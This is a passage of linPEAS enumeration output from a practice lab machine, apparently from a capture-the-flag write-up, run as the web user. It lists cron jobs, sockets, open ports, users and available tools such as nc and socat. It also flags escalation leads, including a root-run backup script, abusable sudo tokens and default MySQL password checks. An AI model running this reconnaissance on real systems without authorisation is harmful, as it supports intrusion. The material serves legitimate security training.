/usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">* * * * * /home/grimmie/backup.sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Systemd PATH</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                </span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing .service files</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                   </span></span><br><span class="line"><span class="string">/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path                             </span></span><br><span class="line"><span class="string">/etc/systemd/system/mysql.service could be executing some relative path</span></span><br><span class="line"><span class="string">/etc/systemd/system/mysqld.service could be executing some relative path</span></span><br><span class="line"><span class="string">You can&#x27;</span>t write on systemd PATH</span><br><span class="line"></span><br><span class="line">╔══════════╣ System timers</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                     </span><br><span class="line">NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES      </span><br><span class="line">Thu 2024-02-15 14:39:00 EST  22min left Thu 2024-02-15 14:09:01 EST  7min ago     phpsessionclean.timer        phpsessionclean.service</span><br><span class="line">Fri 2024-02-16 00:00:00 EST  9h left    n/a                          n/a          logrotate.timer              logrotate.service</span><br><span class="line">Fri 2024-02-16 00:00:00 EST  9h left    n/a                          n/a          man-db.timer                 man-db.service</span><br><span class="line">Fri 2024-02-16 05:17:18 EST  15h left   n/a                          n/a          apt-daily.timer              apt-daily.service</span><br><span class="line">Fri 2024-02-16 06:58:25 EST  16h left   n/a                          n/a          apt-daily-upgrade.timer      apt-daily-upgrade.service</span><br><span class="line">Fri 2024-02-16 11:30:17 EST  21h left   Thu 2024-02-15 11:30:17 EST  2h 46min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service</span><br><span class="line"></span><br><span class="line">╔══════════╣ Analyzing .timer files</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                     </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ Analyzing .socket files</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                    </span><br><span class="line">/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                        </span><br><span class="line">/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket</span><br><span class="line">/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                                                </span><br><span class="line">/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                                                         </span><br><span class="line">/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                                                         </span><br><span class="line">/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog</span><br><span class="line">/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log</span><br><span class="line">/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout</span><br><span class="line">/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket</span><br><span class="line"></span><br><span class="line">╔══════════╣ Unix Sockets Listening</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                    </span><br><span class="line">sed: -e expression <span class="comment">#1, char 0: no previous regular expression                                                                 </span></span><br><span class="line">/run/dbus/system_bus_socket</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/mysqld/mysqld.sock</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/fsck.progress</span><br><span class="line">/run/systemd/journal/dev-log</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/journal/socket</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/journal/stdout</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/journal/syslog</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/notify</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/private</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/udev/control</span><br><span class="line">/run/user/0/systemd/private</span><br><span class="line">/var/run/dbus/system_bus_socket</span><br><span class="line">  └─(Read Write)</span><br><span class="line"></span><br><span class="line">╔══════════╣ D-Bus config files</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                      </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ D-Bus Service Objects list</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                      </span><br><span class="line">NAME                             PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION</span><br><span class="line">:1.0                               1 systemd         root             :1.0          init.scope                -          -</span><br><span class="line">:1.1                             419 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service -          -</span><br><span class="line">:1.17                            639 systemd         root             :1.17         user@0.service            -          -</span><br><span class="line">:1.282                          7944 busctl          www-data         :1.282        apache2.service           -          -</span><br><span class="line">:1.5                             430 systemd-logind  root             :1.5          systemd-logind.service    -          -</span><br><span class="line">org.freedesktop.DBus               1 systemd         root             -             init.scope                -          -</span><br><span class="line">org.freedesktop.hostname1          - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.locale1            - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.login1           430 systemd-logind  root             :1.5          systemd-logind.service    -          -</span><br><span class="line">org.freedesktop.network1           - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.resolve1           - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.systemd1           1 systemd         root             :1.0          init.scope                -          -</span><br><span class="line">org.freedesktop.timedate1          - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.timesync1        419 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service -          -</span><br><span class="line"></span><br><span class="line">                              ╔═════════════════════╗</span><br><span class="line">══════════════════════════════╣ Network Information ╠══════════════════════════════                                           </span><br><span class="line">                              ╚═════════════════════╝                                                                         </span><br><span class="line">╔══════════╣ Hostname, hosts and DNS</span><br><span class="line">academy                                                                                                                       </span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">127.0.1.1       academy.tcm.sec academy</span><br><span class="line"></span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">domain localdomain</span><br><span class="line">search localdomain</span><br><span class="line">nameserver 192.168.19.2</span><br><span class="line">tcm.sec</span><br><span class="line"></span><br><span class="line">╔══════════╣ Interfaces</span><br><span class="line">default         0.0.0.0                                                                                                       </span><br><span class="line">loopback        127.0.0.0</span><br><span class="line">link-local      169.254.0.0</span><br><span class="line"></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:ac:4e:32 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.19.141/24 brd 192.168.19.255 scope global dynamic ens33</span><br><span class="line">       valid_lft 1337sec preferred_lft 1337sec</span><br><span class="line">    inet6 fe80::20c:29ff:feac:4e32/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br><span class="line">╔══════════╣ Active Ports</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                 </span><br><span class="line">tcp     LISTEN   0        80             127.0.0.1:3306          0.0.0.0:*                                                    </span><br><span class="line">tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      </span><br><span class="line">tcp     LISTEN   0        128                    *:80                  *:*      </span><br><span class="line">tcp     LISTEN   0        32                     *:21                  *:*      </span><br><span class="line">tcp     LISTEN   0        128                 [::]:22               [::]:*      </span><br><span class="line"></span><br><span class="line">╔══════════╣ Can I sniff with tcpdump?</span><br><span class="line">No                                                                                                                            </span><br><span class="line">                                                                                                                              </span><br><span class="line"></span><br><span class="line">                               ╔═══════════════════╗</span><br><span class="line">═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                           </span><br><span class="line">                               ╚═══════════════════╝                                                                          </span><br><span class="line">╔══════════╣ My user</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#<span class="built_in">users</span>                                                      </span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)                                                                         </span><br><span class="line"></span><br><span class="line">╔══════════╣ Do I have PGP keys?</span><br><span class="line">gpg Not Found                                                                                                                 </span><br><span class="line">netpgpkeys Not Found                                                                                                          </span><br><span class="line">netpgp Not Found                                                                                                              </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ Checking <span class="string">&#x27;sudo -l&#x27;</span>, /etc/sudoers, and /etc/sudoers.d</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ Checking <span class="built_in">sudo</span> tokens</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                        </span><br><span class="line">ptrace protection is disabled (0), so <span class="built_in">sudo</span> tokens could be abused                                                             </span><br><span class="line"></span><br><span class="line">╔══════════╣ Checking Pkexec policy</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                    </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ Superusers</span><br><span class="line">root:x:0:0:root:/root:/bin/bash                                                                                               </span><br><span class="line"></span><br><span class="line">╔══════════╣ Users with console</span><br><span class="line">grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                  </span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">╔══════════╣ All <span class="built_in">users</span> &amp; <span class="built_in">groups</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)                                                                                        </span><br><span class="line">uid=1(daemon[0m) gid=1(daemon[0m) <span class="built_in">groups</span>=1(daemon[0m)</span><br><span class="line">uid=10(uucp) gid=10(uucp) <span class="built_in">groups</span>=10(uucp)</span><br><span class="line">uid=100(_apt) gid=65534(nogroup) <span class="built_in">groups</span>=65534(nogroup)</span><br><span class="line">uid=1000(grimmie) gid=1000(administrator) <span class="built_in">groups</span>=1000(administrator),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)                                                                                                               </span><br><span class="line">uid=101(systemd-timesync) gid=102(systemd-timesync) <span class="built_in">groups</span>=102(systemd-timesync)</span><br><span class="line">uid=102(systemd-network) gid=103(systemd-network) <span class="built_in">groups</span>=103(systemd-network)</span><br><span class="line">uid=103(systemd-resolve) gid=104(systemd-resolve) <span class="built_in">groups</span>=104(systemd-resolve)</span><br><span class="line">uid=104(messagebus) gid=110(messagebus) <span class="built_in">groups</span>=110(messagebus)</span><br><span class="line">uid=105(sshd) gid=65534(nogroup) <span class="built_in">groups</span>=65534(nogroup)</span><br><span class="line">uid=106(mysql) gid=113(mysql) <span class="built_in">groups</span>=113(mysql)</span><br><span class="line">uid=107(ftp) gid=114(ftp) <span class="built_in">groups</span>=114(ftp)</span><br><span class="line">uid=13(proxy) gid=13(proxy) <span class="built_in">groups</span>=13(proxy)</span><br><span class="line">uid=2(bin) gid=2(bin) <span class="built_in">groups</span>=2(bin)</span><br><span class="line">uid=3(sys) gid=3(sys) <span class="built_in">groups</span>=3(sys)</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">uid=34(backup) gid=34(backup) <span class="built_in">groups</span>=34(backup)</span><br><span class="line">uid=38(list) gid=38(list) <span class="built_in">groups</span>=38(list)</span><br><span class="line">uid=39(irc) gid=39(irc) <span class="built_in">groups</span>=39(irc)</span><br><span class="line">uid=4(<span class="built_in">sync</span>) gid=65534(nogroup) <span class="built_in">groups</span>=65534(nogroup)</span><br><span class="line">uid=41(gnats) gid=41(gnats) <span class="built_in">groups</span>=41(gnats)</span><br><span class="line">uid=5(games) gid=60(games) <span class="built_in">groups</span>=60(games)</span><br><span class="line">uid=6(man) gid=12(man) <span class="built_in">groups</span>=12(man)</span><br><span class="line">uid=65534(nobody) gid=65534(nogroup) <span class="built_in">groups</span>=65534(nogroup)</span><br><span class="line">uid=7(lp) gid=7(lp) <span class="built_in">groups</span>=7(lp)</span><br><span class="line">uid=8(mail) gid=8(mail) <span class="built_in">groups</span>=8(mail)</span><br><span class="line">uid=9(news) gid=9(news) <span class="built_in">groups</span>=9(news)</span><br><span class="line">uid=999(systemd-coredump) gid=999(systemd-coredump) <span class="built_in">groups</span>=999(systemd-coredump)</span><br><span class="line"></span><br><span class="line">╔══════════╣ Login now</span><br><span class="line"> 14:16:26 up  3:01,  1 user,  load average: 0.30, 0.07, 0.02                                                                  </span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     tty1     -                11:16    2:55m  0.02s  0.01s -bash</span><br><span class="line"></span><br><span class="line">╔══════════╣ Last logons</span><br><span class="line">root     tty1         Sat May 29 13:31:08 2021 - down                      (00:12)     0.0.0.0                                </span><br><span class="line">reboot   system boot  Sat May 29 13:30:20 2021 - Sat May 29 13:43:39 2021  (00:13)     0.0.0.0</span><br><span class="line">root     pts/0        Sat May 29 13:16:54 2021 - Sat May 29 13:27:56 2021  (00:11)     192.168.10.31</span><br><span class="line">root     tty1         Sat May 29 13:16:34 2021 - down                      (00:11)     0.0.0.0</span><br><span class="line">reboot   system boot  Sat May 29 13:15:21 2021 - Sat May 29 13:27:58 2021  (00:12)     0.0.0.0</span><br><span class="line">root     pts/0        Sat May 29 13:08:39 2021 - Sat May 29 13:14:47 2021  (00:06)     192.168.10.31</span><br><span class="line">administrator tty1         Sat May 29 13:06:40 2021 - down                      (00:08)     0.0.0.0</span><br><span class="line">reboot   system boot  Sat May 29 13:05:58 2021 - Sat May 29 13:14:49 2021  (00:08)     0.0.0.0</span><br><span class="line"></span><br><span class="line">wtmp begins Sat May 29 13:05:58 2021</span><br><span class="line"></span><br><span class="line">╔══════════╣ Last <span class="keyword">time</span> logon each user</span><br><span class="line">Username         Port     From             Latest                                                                             </span><br><span class="line">root             tty1                      Thu Feb 15 11:16:30 -0500 2024</span><br><span class="line">grimmie          pts/1    192.168.10.31    Sun May 30 03:21:39 -0400 2021</span><br><span class="line"></span><br><span class="line">╔══════════╣ Do not forget to <span class="built_in">test</span> <span class="string">&#x27;su&#x27;</span> as any other user with shell: without password and with their names as password (I don<span class="string">&#x27;t do it in FAST mode...)                                                                                                     </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Do not forget to execute &#x27;</span><span class="built_in">sudo</span> -l<span class="string">&#x27; without password or with valid password (if you know it)!!</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                             ╔══════════════════════╗</span></span><br><span class="line"><span class="string">═════════════════════════════╣ Software Information ╠═════════════════════════════                                            </span></span><br><span class="line"><span class="string">                             ╚══════════════════════╝                                                                         </span></span><br><span class="line"><span class="string">╔══════════╣ Useful software</span></span><br><span class="line"><span class="string">/usr/bin/base64                                                                                                               </span></span><br><span class="line"><span class="string">/usr/bin/nc</span></span><br><span class="line"><span class="string">/usr/bin/nc.traditional</span></span><br><span class="line"><span class="string">/usr/bin/netcat</span></span><br><span class="line"><span class="string">/usr/bin/perl</span></span><br><span class="line"><span class="string">/usr/bin/php</span></span><br><span class="line"><span class="string">/usr/bin/ping</span></span><br><span class="line"><span class="string">/usr/bin/python</span></span><br><span class="line"><span class="string">/usr/bin/python2</span></span><br><span class="line"><span class="string">/usr/bin/python2.7</span></span><br><span class="line"><span class="string">/usr/bin/python3</span></span><br><span class="line"><span class="string">/usr/bin/python3.7</span></span><br><span class="line"><span class="string">/usr/bin/socat</span></span><br><span class="line"><span class="string">/usr/bin/wget</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Installed Compilers</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ MySQL version</span></span><br><span class="line"><span class="string">mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">═╣ MySQL connection using default root/root ........... No</span></span><br><span class="line"><span class="string">═╣ MySQL connection using root/toor ................... No                                                                    </span></span><br><span class="line"><span class="string">═╣ MySQL connection using root/NOPASS ................. No                                                                    </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Searching mysql credentials and exec</span></span><br><span class="line"><span class="string">From &#x27;</span>/etc/mysql/mariadb.conf.d/50-server.cnf<span class="string">&#x27; Mysql user: user                    = mysql                                    </span></span><br><span class="line"><span class="string">Found readable /etc/mysql/my.cnf</span></span><br><span class="line"><span class="string">[client-server]</span></span><br><span class="line"><span class="string">!includedir /etc/mysql/conf.d/</span></span><br><span class="line"><span class="string">!includedir /etc/mysql/mariadb.conf.d/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing MariaDB Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 869 Oct 12  2020 /etc/mysql/mariadb.cnf                                                                </span></span><br><span class="line"><span class="string">[client-server]</span></span><br><span class="line"><span class="string">!includedir /etc/mysql/conf.d/</span></span><br><span class="line"><span class="string">!includedir /etc/mysql/mariadb.conf.d/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw------- 1 root root 277 May 29  2021 /etc/mysql/debian.cnf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Apache-Nginx Files (limit 70)</span></span><br><span class="line"><span class="string">Apache version: Server version: Apache/2.4.38 (Debian)                                                                        </span></span><br><span class="line"><span class="string">Server built:   2020-08-25T20:08:29</span></span><br><span class="line"><span class="string">httpd Not Found</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">Nginx version: nginx Not Found</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf-        &lt;IfModule mod_mime.c&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf:            AddType application/x-httpd-php .php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf-        &lt;FilesMatch &quot;.+\.php$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf:            SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf-        &lt;IfModule mod_mime.c&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf:            AddType application/x-httpd-php .php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf-        &lt;FilesMatch &quot;.+\.php$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf:            SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf-        &lt;IfModule mod_mime.c&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf:            AddType application/x-httpd-php .php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf-        &lt;FilesMatch &quot;.+\.php$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf:            SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf-        &lt;IfModule mod_mime.c&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf:            AddType application/x-httpd-php .php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf-        &lt;FilesMatch &quot;.+\.php$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf:            SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/mods-available/php7.3.conf-&lt;FilesMatch &quot;.+\.ph(ar|p|tml)$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/mods-available/php7.3.conf:    SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/mods-available/php7.3.conf-&lt;FilesMatch &quot;.+\.phps$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/mods-available/php7.3.conf:    SetHandler application/x-httpd-php-source</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/mods-enabled/php7.3.conf-&lt;FilesMatch &quot;.+\.ph(ar|p|tml)$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/mods-enabled/php7.3.conf:    SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/mods-enabled/php7.3.conf-&lt;FilesMatch &quot;.+\.phps$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/mods-enabled/php7.3.conf:    SetHandler application/x-httpd-php-source</span></span><br><span class="line"><span class="string">══╣ PHP exec extensions</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /etc/apache2/sites-enabled                                                           </span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /etc/apache2/sites-enabled</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root 35 May 29  2021 /etc/apache2/sites-enabled/000-default.conf -&gt; ../sites-available/000-default.conf</span></span><br><span class="line"><span class="string">&lt;VirtualHost *:80&gt;</span></span><br><span class="line"><span class="string">        ServerAdmin webmaster@localhost</span></span><br><span class="line"><span class="string">        DocumentRoot /var/www/html</span></span><br><span class="line"><span class="string">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span></span><br><span class="line"><span class="string">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span></span><br><span class="line"><span class="string">&lt;/VirtualHost&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 1332 Aug  8  2020 /etc/apache2/sites-available/000-default.conf</span></span><br><span class="line"><span class="string">&lt;VirtualHost *:80&gt;</span></span><br><span class="line"><span class="string">        ServerAdmin webmaster@localhost</span></span><br><span class="line"><span class="string">        DocumentRoot /var/www/html</span></span><br><span class="line"><span class="string">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span></span><br><span class="line"><span class="string">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span></span><br><span class="line"><span class="string">&lt;/VirtualHost&gt;</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root 35 May 29  2021 /etc/apache2/sites-enabled/000-default.conf -&gt; ../sites-available/000-default.conf</span></span><br><span class="line"><span class="string">&lt;VirtualHost *:80&gt;</span></span><br><span class="line"><span class="string">        ServerAdmin webmaster@localhost</span></span><br><span class="line"><span class="string">        DocumentRoot /var/www/html</span></span><br><span class="line"><span class="string">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span></span><br><span class="line"><span class="string">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span></span><br><span class="line"><span class="string">&lt;/VirtualHost&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 71958 Feb 13  2021 /etc/php/7.3/apache2/php.ini</span></span><br><span class="line"><span class="string">allow_url_fopen = On</span></span><br><span class="line"><span class="string">allow_url_include = Off</span></span><br><span class="line"><span class="string">odbc.allow_persistent = On</span></span><br><span class="line"><span class="string">ibase.allow_persistent = 1</span></span><br><span class="line"><span class="string">mysqli.allow_persistent = On</span></span><br><span class="line"><span class="string">pgsql.allow_persistent = On</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 71570 Feb 13  2021 /etc/php/7.3/cli/php.ini</span></span><br><span class="line"><span class="string">allow_url_fopen = On</span></span><br><span class="line"><span class="string">allow_url_include = Off</span></span><br><span class="line"><span class="string">odbc.allow_persistent = On</span></span><br><span class="line"><span class="string">ibase.allow_persistent = 1</span></span><br><span class="line"><span class="string">mysqli.allow_persistent = On</span></span><br><span class="line"><span class="string">pgsql.allow_persistent = On</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Rsync Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 1044 Mar 15  2019 /usr/share/doc/rsync/examples/rsyncd.conf                                            </span></span><br><span class="line"><span class="string">[ftp]</span></span><br><span class="line"><span class="string">        comment = public archive</span></span><br><span class="line"><span class="string">        path = /var/www/pub</span></span><br><span class="line"><span class="string">        use chroot = yes</span></span><br><span class="line"><span class="string">        lock file = /var/lock/rsyncd</span></span><br><span class="line"><span class="string">        read only = yes</span></span><br><span class="line"><span class="string">        list = yes</span></span><br><span class="line"><span class="string">        uid = nobody</span></span><br><span class="line"><span class="string">        gid = nogroup</span></span><br><span class="line"><span class="string">        strict modes = yes</span></span><br><span class="line"><span class="string">        ignore errors = no</span></span><br><span class="line"><span class="string">        ignore nonreadable = yes</span></span><br><span class="line"><span class="string">        transfer logging = no</span></span><br><span class="line"><span class="string">        timeout = 600</span></span><br><span class="line"><span class="string">        refuse options = checksum dry-run</span></span><br><span class="line"><span class="string">        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Ldap Files (limit 70)</span></span><br><span class="line"><span class="string">The password hash is from the &#123;SSHA&#125; to &#x27;</span>structural<span class="string">&#x27;                                                                          </span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /etc/ldap</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching ssl/ssh files</span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing SSH Files (limit 70)                                                                                   </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 174 May 29  2021 /etc/ssh/ssh_host_ecdsa_key.pub</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 94 May 29  2021 /etc/ssh/ssh_host_ed25519_key.pub</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 394 May 29  2021 /etc/ssh/ssh_host_rsa_key.pub</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PermitRootLogin yes</span></span><br><span class="line"><span class="string">ChallengeResponseAuthentication no</span></span><br><span class="line"><span class="string">UsePAM yes</span></span><br><span class="line"><span class="string">══╣ Some certificates were found (out limited):</span></span><br><span class="line"><span class="string">/etc/ssl/certs/ACCVRAIZ1.pem                                                                                                  </span></span><br><span class="line"><span class="string">/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Actalis_Authentication_Root_CA.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/AffirmTrust_Commercial.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/AffirmTrust_Networking.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/AffirmTrust_Premium.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/AffirmTrust_Premium_ECC.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Amazon_Root_CA_1.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Amazon_Root_CA_2.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Amazon_Root_CA_3.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Amazon_Root_CA_4.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Atos_TrustedRoot_2011.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem</span></span><br><span 